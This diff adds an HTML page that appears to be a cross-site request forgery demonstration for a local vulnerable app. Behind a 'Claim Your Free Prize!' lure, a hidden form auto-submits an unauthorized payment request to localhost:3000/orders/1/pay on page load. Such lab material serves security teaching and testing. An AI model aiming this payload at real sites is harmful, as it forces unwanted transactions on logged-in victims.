@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Win a Free Gift Card! (CSRF Demonstration)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background: #fdf2f2;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      display: inline-block;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2 style="color: #c53030;">Claim Your Free Prize!</h2>
+    <p>Please wait while we generate your claim code...</p>
+
+    <!-- Hidden CSRF Attack Form -->
+    <form id="csrfForm" action="http://localhost:3000/orders/1/pay" method="POST">
+      <input type="hidden" name="exploit" value="unauthorized_transfer">
+      <!-- In vulnerable mode, no anti-CSRF token is required, and ambient cookies are sent -->
+    </form>
+  </div>
+
+  <script>
+    // Automatically submit form upon page load to execute Cross-Site Request Forgery
+    window.onload = function() {
+      console.warn("CSRF Demonstration: Auto-submitting unauthorized payment request to http://localhost:3000/orders/1/pay...");
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
